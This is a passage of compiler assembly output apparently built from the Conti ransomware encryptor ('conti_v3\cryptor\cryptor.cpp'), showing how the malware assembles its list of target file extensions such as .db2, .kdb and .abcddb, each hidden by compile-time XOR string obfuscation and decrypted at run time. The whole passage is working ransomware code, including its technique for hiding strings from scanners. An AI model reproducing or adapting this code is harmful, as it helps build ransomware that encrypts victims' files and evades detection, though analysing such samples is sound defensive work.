  03f14	c6 85 d8 06 00
	00 6f		 mov	 BYTE PTR $T155[rbp-248], 111 ; 0000006fH
  03f1b	c6 85 d9 06 00
	00 6f		 mov	 BYTE PTR $T155[rbp-247], 111 ; 0000006fH
  03f22	c6 85 da 06 00
	00 6f		 mov	 BYTE PTR $T155[rbp-246], 111 ; 0000006fH
  03f29	0f b6 85 d1 06
	00 00		 movzx	 eax, BYTE PTR $T155[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 448  : 		OBFW(L".xld"),

  03f30	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03f35	48 89 85 00 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+976], rax

; 449  : 		OBFW(L".xmlff"),

  03f3c	48 8d 8d 00 09
	00 00		 lea	 rcx, QWORD PTR $T156[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03f43	c6 85 00 09 00
	00 00		 mov	 BYTE PTR $T156[rbp-256], 0
  03f4a	c6 85 01 09 00
	00 54		 mov	 BYTE PTR $T156[rbp-255], 84 ; 00000054H
  03f51	c6 85 02 09 00
	00 78		 mov	 BYTE PTR $T156[rbp-254], 120 ; 00000078H
  03f58	c6 85 03 09 00
	00 04		 mov	 BYTE PTR $T156[rbp-253], 4
  03f5f	c6 85 04 09 00
	00 78		 mov	 BYTE PTR $T156[rbp-252], 120 ; 00000078H
  03f66	c6 85 05 09 00
	00 70		 mov	 BYTE PTR $T156[rbp-251], 112 ; 00000070H
  03f6d	c6 85 06 09 00
	00 78		 mov	 BYTE PTR $T156[rbp-250], 120 ; 00000078H
  03f74	c6 85 07 09 00
	00 29		 mov	 BYTE PTR $T156[rbp-249], 41 ; 00000029H
  03f7b	c6 85 08 09 00
	00 78		 mov	 BYTE PTR $T156[rbp-248], 120 ; 00000078H
  03f82	c6 85 09 09 00
	00 7b		 mov	 BYTE PTR $T156[rbp-247], 123 ; 0000007bH
  03f89	c6 85 0a 09 00
	00 78		 mov	 BYTE PTR $T156[rbp-246], 120 ; 00000078H
  03f90	c6 85 0b 09 00
	00 7b		 mov	 BYTE PTR $T156[rbp-245], 123 ; 0000007bH
  03f97	c6 85 0c 09 00
	00 78		 mov	 BYTE PTR $T156[rbp-244], 120 ; 00000078H
  03f9e	c6 85 0d 09 00
	00 78		 mov	 BYTE PTR $T156[rbp-243], 120 ; 00000078H
  03fa5	c6 85 0e 09 00
	00 78		 mov	 BYTE PTR $T156[rbp-242], 120 ; 00000078H
  03fac	0f b6 85 01 09
	00 00		 movzx	 eax, BYTE PTR $T156[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 449  : 		OBFW(L".xmlff"),

  03fb3	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  03fb8	48 89 85 08 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+984], rax

; 450  : 		OBFW(L".abcddb"),

  03fbf	48 8d 8d 98 09
	00 00		 lea	 rcx, QWORD PTR $T157[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03fc6	c6 85 98 09 00
	00 00		 mov	 BYTE PTR $T157[rbp-256], 0
  03fcd	c6 85 99 09 00
	00 33		 mov	 BYTE PTR $T157[rbp-255], 51 ; 00000033H
  03fd4	c6 85 9a 09 00
	00 1f		 mov	 BYTE PTR $T157[rbp-254], 31
  03fdb	c6 85 9b 09 00
	00 1d		 mov	 BYTE PTR $T157[rbp-253], 29
  03fe2	c6 85 9c 09 00
	00 1f		 mov	 BYTE PTR $T157[rbp-252], 31
  03fe9	c6 85 9d 09 00
	00 2e		 mov	 BYTE PTR $T157[rbp-251], 46 ; 0000002eH
  03ff0	c6 85 9e 09 00
	00 1f		 mov	 BYTE PTR $T157[rbp-250], 31
  03ff7	c6 85 9f 09 00
	00 3f		 mov	 BYTE PTR $T157[rbp-249], 63 ; 0000003fH
  03ffe	c6 85 a0 09 00
	00 1f		 mov	 BYTE PTR $T157[rbp-248], 31
  04005	c6 85 a1 09 00
	00 50		 mov	 BYTE PTR $T157[rbp-247], 80 ; 00000050H
  0400c	c6 85 a2 09 00
	00 1f		 mov	 BYTE PTR $T157[rbp-246], 31
  04013	c6 85 a3 09 00
	00 50		 mov	 BYTE PTR $T157[rbp-245], 80 ; 00000050H
  0401a	c6 85 a4 09 00
	00 1f		 mov	 BYTE PTR $T157[rbp-244], 31
  04021	c6 85 a5 09 00
	00 2e		 mov	 BYTE PTR $T157[rbp-243], 46 ; 0000002eH
  04028	c6 85 a6 09 00
	00 1f		 mov	 BYTE PTR $T157[rbp-242], 31
  0402f	c6 85 a7 09 00
	00 1f		 mov	 BYTE PTR $T157[rbp-241], 31
  04036	c6 85 a8 09 00
	00 1f		 mov	 BYTE PTR $T157[rbp-240], 31
  0403d	0f b6 85 99 09
	00 00		 movzx	 eax, BYTE PTR $T157[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 450  : 		OBFW(L".abcddb"),

  04044	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ; MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
  04049	48 89 85 10 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+992], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  04050	c6 85 e0 06 00
	00 00		 mov	 BYTE PTR $T158[rbp-256], 0
  04057	c6 85 e1 06 00
	00 25		 mov	 BYTE PTR $T158[rbp-255], 37 ; 00000025H
  0405e	c6 85 e2 06 00
	00 0c		 mov	 BYTE PTR $T158[rbp-254], 12
  04065	c6 85 e3 06 00
	00 49		 mov	 BYTE PTR $T158[rbp-253], 73 ; 00000049H
  0406c	c6 85 e4 06 00
	00 0c		 mov	 BYTE PTR $T158[rbp-252], 12
  04073	c6 85 e5 06 00
	00 7e		 mov	 BYTE PTR $T158[rbp-251], 126 ; 0000007eH
  0407a	c6 85 e6 06 00
	00 0c		 mov	 BYTE PTR $T158[rbp-250], 12
  04081	c6 85 e7 06 00
	00 0b		 mov	 BYTE PTR $T158[rbp-249], 11
  04088	c6 85 e8 06 00
	00 0c		 mov	 BYTE PTR $T158[rbp-248], 12

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0408f	c6 85 e9 06 00
	00 0c		 mov	 BYTE PTR $T158[rbp-247], 12
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 451  : 		OBFW(L".abs"),

  04096	48 8d 8d e0 06
	00 00		 lea	 rcx, QWORD PTR $T158[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0409d	c6 85 ea 06 00
	00 0c		 mov	 BYTE PTR $T158[rbp-246], 12
  040a4	0f b6 85 e1 06
	00 00		 movzx	 eax, BYTE PTR $T158[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 451  : 		OBFW(L".abs"),

  040ab	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  040b0	48 89 85 18 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1000], rax

; 452  : 		OBFW(L".abx"),

  040b7	48 8d 8d f0 06
	00 00		 lea	 rcx, QWORD PTR $T159[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  040be	c6 85 f0 06 00
	00 00		 mov	 BYTE PTR $T159[rbp-256], 0
  040c5	c6 85 f1 06 00
	00 71		 mov	 BYTE PTR $T159[rbp-255], 113 ; 00000071H
  040cc	c6 85 f2 06 00
	00 69		 mov	 BYTE PTR $T159[rbp-254], 105 ; 00000069H
  040d3	c6 85 f3 06 00
	00 1c		 mov	 BYTE PTR $T159[rbp-253], 28
  040da	c6 85 f4 06 00
	00 69		 mov	 BYTE PTR $T159[rbp-252], 105 ; 00000069H
  040e1	c6 85 f5 06 00
	00 6f		 mov	 BYTE PTR $T159[rbp-251], 111 ; 0000006fH
  040e8	c6 85 f6 06 00
	00 69		 mov	 BYTE PTR $T159[rbp-250], 105 ; 00000069H
  040ef	c6 85 f7 06 00
	00 20		 mov	 BYTE PTR $T159[rbp-249], 32 ; 00000020H
  040f6	c6 85 f8 06 00
	00 69		 mov	 BYTE PTR $T159[rbp-248], 105 ; 00000069H
  040fd	c6 85 f9 06 00
	00 69		 mov	 BYTE PTR $T159[rbp-247], 105 ; 00000069H
  04104	c6 85 fa 06 00
	00 69		 mov	 BYTE PTR $T159[rbp-246], 105 ; 00000069H
  0410b	0f b6 85 f1 06
	00 00		 movzx	 eax, BYTE PTR $T159[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 452  : 		OBFW(L".abx"),

  04112	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  04117	48 89 85 20 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1008], rax

; 453  : 		OBFW(L".accdw"),

  0411e	48 8d 8d 10 09
	00 00		 lea	 rcx, QWORD PTR $T160[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  04125	c6 85 10 09 00
	00 00		 mov	 BYTE PTR $T160[rbp-256], 0
  0412c	c6 85 11 09 00
	00 33		 mov	 BYTE PTR $T160[rbp-255], 51 ; 00000033H
  04133	c6 85 12 09 00
	00 64		 mov	 BYTE PTR $T160[rbp-254], 100 ; 00000064H
  0413a	c6 85 13 09 00
	00 10		 mov	 BYTE PTR $T160[rbp-253], 16
  04141	c6 85 14 09 00
	00 64		 mov	 BYTE PTR $T160[rbp-252], 100 ; 00000064H
  04148	c6 85 15 09 00
	00 2f		 mov	 BYTE PTR $T160[rbp-251], 47 ; 0000002fH
  0414f	c6 85 16 09 00
	00 64		 mov	 BYTE PTR $T160[rbp-250], 100 ; 00000064H
  04156	c6 85 17 09 00
	00 2f		 mov	 BYTE PTR $T160[rbp-249], 47 ; 0000002fH
  0415d	c6 85 18 09 00
	00 64		 mov	 BYTE PTR $T160[rbp-248], 100 ; 00000064H
  04164	c6 85 19 09 00
	00 7e		 mov	 BYTE PTR $T160[rbp-247], 126 ; 0000007eH
  0416b	c6 85 1a 09 00
	00 64		 mov	 BYTE PTR $T160[rbp-246], 100 ; 00000064H
  04172	c6 85 1b 09 00
	00 67		 mov	 BYTE PTR $T160[rbp-245], 103 ; 00000067H
  04179	c6 85 1c 09 00
	00 64		 mov	 BYTE PTR $T160[rbp-244], 100 ; 00000064H
  04180	c6 85 1d 09 00
	00 64		 mov	 BYTE PTR $T160[rbp-243], 100 ; 00000064H
  04187	c6 85 1e 09 00
	00 64		 mov	 BYTE PTR $T160[rbp-242], 100 ; 00000064H
  0418e	0f b6 85 11 09
	00 00		 movzx	 eax, BYTE PTR $T160[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 453  : 		OBFW(L".accdw"),

  04195	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<79,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  0419a	48 89 85 28 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1016], rax

; 454  : 		OBFW(L".adn"),

  041a1	48 8d 8d 00 07
	00 00		 lea	 rcx, QWORD PTR $T161[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  041a8	c6 85 00 07 00
	00 00		 mov	 BYTE PTR $T161[rbp-256], 0
  041af	c6 85 01 07 00
	00 49		 mov	 BYTE PTR $T161[rbp-255], 73 ; 00000049H
  041b6	c6 85 02 07 00
	00 27		 mov	 BYTE PTR $T161[rbp-254], 39 ; 00000027H
  041bd	c6 85 03 07 00
	00 3d		 mov	 BYTE PTR $T161[rbp-253], 61 ; 0000003dH
  041c4	c6 85 04 07 00
	00 27		 mov	 BYTE PTR $T161[rbp-252], 39 ; 00000027H
  041cb	c6 85 05 07 00
	00 08		 mov	 BYTE PTR $T161[rbp-251], 8
  041d2	c6 85 06 07 00
	00 27		 mov	 BYTE PTR $T161[rbp-250], 39 ; 00000027H
  041d9	c6 85 07 07 00
	00 2b		 mov	 BYTE PTR $T161[rbp-249], 43 ; 0000002bH
  041e0	c6 85 08 07 00
	00 27		 mov	 BYTE PTR $T161[rbp-248], 39 ; 00000027H
  041e7	c6 85 09 07 00
	00 27		 mov	 BYTE PTR $T161[rbp-247], 39 ; 00000027H
  041ee	c6 85 0a 07 00
	00 27		 mov	 BYTE PTR $T161[rbp-246], 39 ; 00000027H
  041f5	0f b6 85 01 07
	00 00		 movzx	 eax, BYTE PTR $T161[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 454  : 		OBFW(L".adn"),

  041fc	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<67,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  04201	48 89 85 30 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1024], rax

; 455  : 		OBFW(L".db2"),

  04208	48 8d 8d 10 07
	00 00		 lea	 rcx, QWORD PTR $T162[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0420f	c6 85 10 07 00
	00 00		 mov	 BYTE PTR $T162[rbp-256], 0
  04216	c6 85 11 07 00
	00 4b		 mov	 BYTE PTR $T162[rbp-255], 75 ; 0000004bH
  0421d	c6 85 12 07 00
	00 5a		 mov	 BYTE PTR $T162[rbp-254], 90 ; 0000005aH
  04224	c6 85 13 07 00
	00 55		 mov	 BYTE PTR $T162[rbp-253], 85 ; 00000055H
  0422b	c6 85 14 07 00
	00 5a		 mov	 BYTE PTR $T162[rbp-252], 90 ; 0000005aH
  04232	c6 85 15 07 00
	00 2f		 mov	 BYTE PTR $T162[rbp-251], 47 ; 0000002fH
  04239	c6 85 16 07 00
	00 5a		 mov	 BYTE PTR $T162[rbp-250], 90 ; 0000005aH
  04240	c6 85 17 07 00
	00 18		 mov	 BYTE PTR $T162[rbp-249], 24
  04247	c6 85 18 07 00
	00 5a		 mov	 BYTE PTR $T162[rbp-248], 90 ; 0000005aH
  0424e	c6 85 19 07 00
	00 5a		 mov	 BYTE PTR $T162[rbp-247], 90 ; 0000005aH
  04255	c6 85 1a 07 00
	00 5a		 mov	 BYTE PTR $T162[rbp-246], 90 ; 0000005aH
  0425c	0f b6 85 11 07
	00 00		 movzx	 eax, BYTE PTR $T162[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 455  : 		OBFW(L".db2"),

  04263	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BD@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<19,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  04268	48 89 85 38 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1032], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0426f	c6 85 20 07 00
	00 00		 mov	 BYTE PTR $T163[rbp-256], 0
  04276	c6 85 21 07 00
	00 3c		 mov	 BYTE PTR $T163[rbp-255], 60 ; 0000003cH
  0427d	c6 85 22 07 00
	00 2b		 mov	 BYTE PTR $T163[rbp-254], 43 ; 0000002bH
  04284	c6 85 23 07 00
	00 1f		 mov	 BYTE PTR $T163[rbp-253], 31
  0428b	c6 85 24 07 00
	00 2b		 mov	 BYTE PTR $T163[rbp-252], 43 ; 0000002bH
  04292	c6 85 25 07 00
	00 4b		 mov	 BYTE PTR $T163[rbp-251], 75 ; 0000004bH
  04299	c6 85 26 07 00
	00 2b		 mov	 BYTE PTR $T163[rbp-250], 43 ; 0000002bH
  042a0	c6 85 27 07 00
	00 68		 mov	 BYTE PTR $T163[rbp-249], 104 ; 00000068H
  042a7	c6 85 28 07 00
	00 2b		 mov	 BYTE PTR $T163[rbp-248], 43 ; 0000002bH
  042ae	c6 85 29 07 00
	00 2b		 mov	 BYTE PTR $T163[rbp-247], 43 ; 0000002bH
  042b5	c6 85 2a 07 00
	00 2b		 mov	 BYTE PTR $T163[rbp-246], 43 ; 0000002bH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  042bc	0f b6 85 21 07
	00 00		 movzx	 eax, BYTE PTR $T163[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 456  : 		OBFW(L".fm5"),

  042c3	48 8d 8d 20 07
	00 00		 lea	 rcx, QWORD PTR $T163[rbp-256]
  042ca	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  042cf	48 89 85 40 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1040], rax

; 457  : 		OBFW(L".hjt"),

  042d6	48 8d 8d 30 07
	00 00		 lea	 rcx, QWORD PTR $T164[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  042dd	c6 85 30 07 00
	00 00		 mov	 BYTE PTR $T164[rbp-256], 0
  042e4	c6 85 31 07 00
	00 07		 mov	 BYTE PTR $T164[rbp-255], 7
  042eb	c6 85 32 07 00
	00 42		 mov	 BYTE PTR $T164[rbp-254], 66 ; 00000042H
  042f2	c6 85 33 07 00
	00 20		 mov	 BYTE PTR $T164[rbp-253], 32 ; 00000020H
  042f9	c6 85 34 07 00
	00 42		 mov	 BYTE PTR $T164[rbp-252], 66 ; 00000042H
  04300	c6 85 35 07 00
	00 2e		 mov	 BYTE PTR $T164[rbp-251], 46 ; 0000002eH
  04307	c6 85 36 07 00
	00 42		 mov	 BYTE PTR $T164[rbp-250], 66 ; 00000042H
  0430e	c6 85 37 07 00
	00 74		 mov	 BYTE PTR $T164[rbp-249], 116 ; 00000074H
  04315	c6 85 38 07 00
	00 42		 mov	 BYTE PTR $T164[rbp-248], 66 ; 00000042H
  0431c	c6 85 39 07 00
	00 42		 mov	 BYTE PTR $T164[rbp-247], 66 ; 00000042H
  04323	c6 85 3a 07 00
	00 42		 mov	 BYTE PTR $T164[rbp-246], 66 ; 00000042H
  0432a	0f b6 85 31 07
	00 00		 movzx	 eax, BYTE PTR $T164[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 457  : 		OBFW(L".hjt"),

  04331	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<7,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  04336	48 89 85 48 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1048], rax

; 458  : 		OBFW(L".icg"),

  0433d	48 8d 8d 40 07
	00 00		 lea	 rcx, QWORD PTR $T165[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  04344	c6 85 40 07 00
	00 00		 mov	 BYTE PTR $T165[rbp-256], 0
  0434b	c6 85 41 07 00
	00 68		 mov	 BYTE PTR $T165[rbp-255], 104 ; 00000068H
  04352	c6 85 42 07 00
	00 4b		 mov	 BYTE PTR $T165[rbp-254], 75 ; 0000004bH
  04359	c6 85 43 07 00
	00 1c		 mov	 BYTE PTR $T165[rbp-253], 28
  04360	c6 85 44 07 00
	00 4b		 mov	 BYTE PTR $T165[rbp-252], 75 ; 0000004bH
  04367	c6 85 45 07 00
	00 60		 mov	 BYTE PTR $T165[rbp-251], 96 ; 00000060H
  0436e	c6 85 46 07 00
	00 4b		 mov	 BYTE PTR $T165[rbp-250], 75 ; 0000004bH
  04375	c6 85 47 07 00
	00 5d		 mov	 BYTE PTR $T165[rbp-249], 93 ; 0000005dH
  0437c	c6 85 48 07 00
	00 4b		 mov	 BYTE PTR $T165[rbp-248], 75 ; 0000004bH
  04383	c6 85 49 07 00
	00 4b		 mov	 BYTE PTR $T165[rbp-247], 75 ; 0000004bH
  0438a	c6 85 4a 07 00
	00 4b		 mov	 BYTE PTR $T165[rbp-246], 75 ; 0000004bH
  04391	0f b6 85 41 07
	00 00		 movzx	 eax, BYTE PTR $T165[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 458  : 		OBFW(L".icg"),

  04398	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BP@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<31,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0439d	48 89 85 50 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1056], rax

; 459  : 		OBFW(L".icr"),

  043a4	48 8d 8d 50 07
	00 00		 lea	 rcx, QWORD PTR $T166[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  043ab	c6 85 50 07 00
	00 00		 mov	 BYTE PTR $T166[rbp-256], 0
  043b2	c6 85 51 07 00
	00 31		 mov	 BYTE PTR $T166[rbp-255], 49 ; 00000031H
  043b9	c6 85 52 07 00
	00 70		 mov	 BYTE PTR $T166[rbp-254], 112 ; 00000070H
  043c0	c6 85 53 07 00
	00 6d		 mov	 BYTE PTR $T166[rbp-253], 109 ; 0000006dH
  043c7	c6 85 54 07 00
	00 70		 mov	 BYTE PTR $T166[rbp-252], 112 ; 00000070H
  043ce	c6 85 55 07 00
	00 3e		 mov	 BYTE PTR $T166[rbp-251], 62 ; 0000003eH
  043d5	c6 85 56 07 00
	00 70		 mov	 BYTE PTR $T166[rbp-250], 112 ; 00000070H
  043dc	c6 85 57 07 00
	00 74		 mov	 BYTE PTR $T166[rbp-249], 116 ; 00000074H
  043e3	c6 85 58 07 00
	00 70		 mov	 BYTE PTR $T166[rbp-248], 112 ; 00000070H
  043ea	c6 85 59 07 00
	00 70		 mov	 BYTE PTR $T166[rbp-247], 112 ; 00000070H
  043f1	c6 85 5a 07 00
	00 70		 mov	 BYTE PTR $T166[rbp-246], 112 ; 00000070H
  043f8	0f b6 85 51 07
	00 00		 movzx	 eax, BYTE PTR $T166[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 459  : 		OBFW(L".icr"),

  043ff	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<29,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  04404	48 89 85 58 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1064], rax

; 460  : 		OBFW(L".kdb"),

  0440b	48 8d 8d 60 07
	00 00		 lea	 rcx, QWORD PTR $T167[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  04412	c6 85 60 07 00
	00 00		 mov	 BYTE PTR $T167[rbp-256], 0
  04419	c6 85 61 07 00
	00 71		 mov	 BYTE PTR $T167[rbp-255], 113 ; 00000071H
  04420	c6 85 62 07 00
	00 5d		 mov	 BYTE PTR $T167[rbp-254], 93 ; 0000005dH
  04427	c6 85 63 07 00
	00 07		 mov	 BYTE PTR $T167[rbp-253], 7
  0442e	c6 85 64 07 00
	00 5d		 mov	 BYTE PTR $T167[rbp-252], 93 ; 0000005dH
  04435	c6 85 65 07 00
	00 0f		 mov	 BYTE PTR $T167[rbp-251], 15
  0443c	c6 85 66 07 00
	00 5d		 mov	 BYTE PTR $T167[rbp-250], 93 ; 0000005dH
  04443	c6 85 67 07 00
	00 6c		 mov	 BYTE PTR $T167[rbp-249], 108 ; 0000006cH
  0444a	c6 85 68 07 00
	00 5d		 mov	 BYTE PTR $T167[rbp-248], 93 ; 0000005dH
  04451	c6 85 69 07 00
	00 5d		 mov	 BYTE PTR $T167[rbp-247], 93 ; 0000005dH
  04458	c6 85 6a 07 00
	00 5d		 mov	 BYTE PTR $T167[rbp-246], 93 ; 0000005dH
  0445f	0f b6 85 61 07
	00 00		 movzx	 eax, BYTE PTR $T167[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 460  : 		OBFW(L".kdb"),

  04466	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<17,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0446b	48 89 85 60 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1072], rax

; 461  : 		OBFW(L".lut"),

  04472	48 8d 8d 70 07
	00 00		 lea	 rcx, QWORD PTR $T168[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  04479	c6 85 70 07 00
	00 00		 mov	 BYTE PTR $T168[rbp-256], 0
  04480	c6 85 71 07 00
	00 07		 mov	 BYTE PTR $T168[rbp-255], 7
  04487	c6 85 72 07 00
	00 3c		 mov	 BYTE PTR $T168[rbp-254], 60 ; 0000003cH
  0448e	c6 85 73 07 00
	00 2e		 mov	 BYTE PTR $T168[rbp-253], 46 ; 0000002eH
  04495	c6 85 74 07 00
	00 3c		 mov	 BYTE PTR $T168[rbp-252], 60 ; 0000003cH
  0449c	c6 85 75 07 00
	00 42		 mov	 BYTE PTR $T168[rbp-251], 66 ; 00000042H
  044a3	c6 85 76 07 00
	00 3c		 mov	 BYTE PTR $T168[rbp-250], 60 ; 0000003cH
  044aa	c6 85 77 07 00
	00 5c		 mov	 BYTE PTR $T168[rbp-249], 92 ; 0000005cH
  044b1	c6 85 78 07 00
	00 3c		 mov	 BYTE PTR $T168[rbp-248], 60 ; 0000003cH
  044b8	c6 85 79 07 00
	00 3c		 mov	 BYTE PTR $T168[rbp-247], 60 ; 0000003cH
  044bf	c6 85 7a 07 00
	00 3c		 mov	 BYTE PTR $T168[rbp-246], 60 ; 0000003cH
  044c6	0f b6 85 71 07
	00 00		 movzx	 eax, BYTE PTR $T168[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 461  : 		OBFW(L".lut"),

  044cd	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<101,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  044d2	48 89 85 68 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1080], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  044d9	c6 85 80 07 00
	00 00		 mov	 BYTE PTR $T169[rbp-256], 0
  044e0	c6 85 81 07 00
	00 24		 mov	 BYTE PTR $T169[rbp-255], 36 ; 00000024H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  044e7	c6 85 82 07 00
